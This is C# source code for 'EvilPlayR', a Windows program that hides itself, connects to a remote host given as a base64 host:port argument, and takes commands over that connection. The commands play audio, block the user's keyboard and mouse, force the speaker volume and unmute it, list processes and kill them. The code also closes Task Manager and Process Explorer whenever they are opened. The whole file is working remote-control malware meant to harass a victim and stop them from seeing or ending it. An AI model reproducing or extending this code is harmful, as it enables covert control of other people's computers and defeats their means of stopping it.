using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace EvilPlayR
{
    public partial class MainForm : Form
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        protected static extern int mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hwndCallback);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);

        int counter = 0;
        bool fileLoaded = false;
        List<int> pids = new List<int>(), doomed = new List<int>();
        List<KeyValuePair<int, string>> delayedCommands = new List<KeyValuePair<int, string>>();
        TextWriter writer;
        TcpClient client;

        public MainForm(string connection)
        {
            try
            {
                string[] ps = Encoding.ASCII.GetString(Convert.FromBase64String(connection)).Split(':');
                client = new TcpClient(ps[0], int.Parse(ps[1]));
            }
            catch
            {
                Environment.Exit(99);
            }
            writer = new StreamWriter(client.GetStream());
            new Thread(Run).Start();
            InitializeComponent();
        }

        private void Run()
        {
            StreamReader sr = new StreamReader(client.GetStream());
            string line;
            try
            {
                while ((line = sr.ReadLine()) != null)
                {
                    InvokeCommand(line);
                }
            }
            catch { }
            Environment.Exit(0);
        }

        private delegate void RunCommandDelegate(string line);

        internal void InvokeCommand(string line)
        {
            this.Invoke(new RunCommandDelegate(RunCommand), line);
        }

        private void RunCommand(string line)
        {
            try
            {
                switch (line[0])
                {
                    case 'h':
                        writer.WriteLine("[h]=help [q]=quit [s]=show [S]=hide [p]=play [P]=pause");
                        writer.WriteLine("[w]=Watch [W]=unwatch [b]=block [B]=unblock [k/K]=kill");
                        writer.WriteLine("[v]=Lock volume [V]=Unlock volume [m]=mixerinfo");
                        break;
                    case 'q':
                        writer.WriteLine("Bye.");
                        writer.Flush();
                        Close(); 
                        break;
                    case 's': Show(); break;
                    case 'S': Hide(); break;
                    case 'w': watch.Checked = true; break;
                    case 'W': watch.Checked = false; break;
                    case 'b': block.Checked = true; break;
                    case 'B': BlockInput(false); block.Checked = false; break;
                    case 'V': volume.Checked = false; break;
                    case 'v':
                        if (line.Length > 1) volvalue.Text = line.Substring(1);
                        volume.Checked = true;
                        break;
                    case 'k':
                    case 'K':

                        int pid = line.Length == 1 ? pids[pids.Count - 1] : pids[int.Parse(line.Substring(1))];
                        Process proc = Process.GetProcessById(pid);
                        if (line[0] == 'k')
                            proc.CloseMainWindow();
                        else
                            proc.Kill();

                        break;
                    case 'p':
                        if (line.Length == 1)
                        {
                            Send("resume snd");
                        }
                        else
                        {
                            if (fileLoaded)
                            {
                                Send("stop snd");
                                Send("close snd");
                            }
                            writer.WriteLine("mciError = " + Send("open \"" + line.Substring(1) + "\" type MPEGVideo alias snd"));
                            Send("play snd");
                            play.Enabled = pause.Enabled = true;
                            fileLoaded = true;
                        }
                        break;
                    case 'P':
                        if (fileLoaded)
                        {
                            Send("pause snd");
                        }
                        break;
                    case 'm':
                        for (uint i = 0; i < Mixer.MixerCount; i++)
                        {
                            Mixer m = Mixer.OpenMixer(i);
                            writer.WriteLine("Mixer: " + m.Name);
                            foreach (MixerLine ml in m.DestinationLines)
                            {
                                writer.WriteLine("   Line " + ml.ComponentType + ": " + ml.Name);
                                foreach (MixerLine cl in ml.ChildLines)
                                {
                                    writer.WriteLine("      ChildLine " + cl.ComponentType + ": " + cl.Name);
                                }
                            }
                            m.Dispose();
                        }
                        break;
                    case '@':
                        int pos = line.IndexOf(" ");
                        int cc = counter + int.Parse(line.Substring(1, pos - 1));
                        delayedCommands.Add(new KeyValuePair<int, string>(cc, line.Substring(pos + 1)));
                        break;
                }
            }
            catch (Exception ex)
            {
                writer.WriteLine(ex.ToString());
            }
            writer.Flush();
        }

        private int Send(string command)
        {
            return mciSendString(command, null, 0, IntPtr.Zero);
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (fileLoaded) Send("stop snd");
            Environment.Exit(0);
        }

        private void timer_Tick(object sender, EventArgs e)
        {
#if !DEBUG
            try
            {
#endif
            if (counter == 0)
            {
                Hide();
            }
            counter++;
            foreach (KeyValuePair<int, string> dc in delayedCommands)
            {
                if (dc.Key == counter)
                {
                    writer.WriteLine("  Running: " + dc.Value);
                    RunCommand(dc.Value);
                }
            }
            if (GetAsyncKeyState((int)Keys.Pause) != 0)
                Show();
            if (block.Checked)
            {
                BlockInput(true);
            }
            if (volume.Checked)
            {
                for (uint i = 0; i < Mixer.MixerCount; i++)
                {
                    Mixer m = Mixer.OpenMixer(i);
                    foreach (MixerLine ml in m.DestinationLines)
                    {
                        if (ml.ComponentType == MixerLineComponentType.DST_SPEAKERS)
                        {
                            FixLine(ml, int.Parse(volvalue.Text));
                            foreach (MixerLine cl in ml.ChildLines)
                            {
                                if (cl.ComponentType == MixerLineComponentType.SRC_WAVEOUT)
                                    FixLine(cl, 1000);
                            }
                        }
                    }
                    m.Dispose();
                }
            }
            if (watch.Checked)
            {
                List<int> dead = new List<int>();
                dead.AddRange(pids);
                foreach (Process proc in Process.GetProcesses())
                {
                    int pid = proc.Id;
                    if (!pids.Contains(pid))
                    {
                        try
                        {
                            writer.WriteLine("+++ [" + pids.Count + "] " + proc.MainModule.ModuleName + " (" + pid + ")");
                            if (proc.MainModule.ModuleName.ToLowerInvariant() == "taskmgr.exe" || proc.MainModule.ModuleName.ToLowerInvariant() == "procexp.exe")
                            {
                                doomed.Add(pid);
                            }
                        }
                        catch { }
                        pids.Add(pid);
                    }
                    if (doomed.Contains(pid))
                        proc.CloseMainWindow();
                    dead.Remove(pid);
                }
                foreach (int pid in dead)
                {
                    if (pid == 0) continue;
                    for (int i = 0; i < pids.Count; i++)
                    {
                        if (pids[i] == pid)
                        {
                            writer.WriteLine("--- [" + i + "] (" + pid + ")");
                            pids[i] = 0;
                        }
                    }
                }
            }
            writer.Flush();
#if !DEBUG
            }
            catch (Exception ex)
            {
                writer.WriteLine(ex.ToString());
            }
#endif
        }

        private void FixLine(MixerLine ml, int value)
        {
            if (ml.MuteSwitch != null)
            {
                ml.MuteSwitch.Values = new bool[ml.MuteSwitch.RawValueMultiplicity];
            }
            if (ml.VolumeControl != null)
            {
                int[] vols = new int[ml.VolumeControl.RawValueMultiplicity];
                for (int i = 0; i < vols.Length; i++)
                {
                    vols[i] = value * 65536 / 1000;
                }
                ml.VolumeControl.Values = vols;
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void hide_Click(object sender, EventArgs e)
        {
            Hide();
        }

        private void play_Click(object sender, EventArgs e)
        {
            Send("resume snd");
        }

        private void pause_Click(object sender, EventArgs e)
        {
            Send("pause snd");
        }
    }
}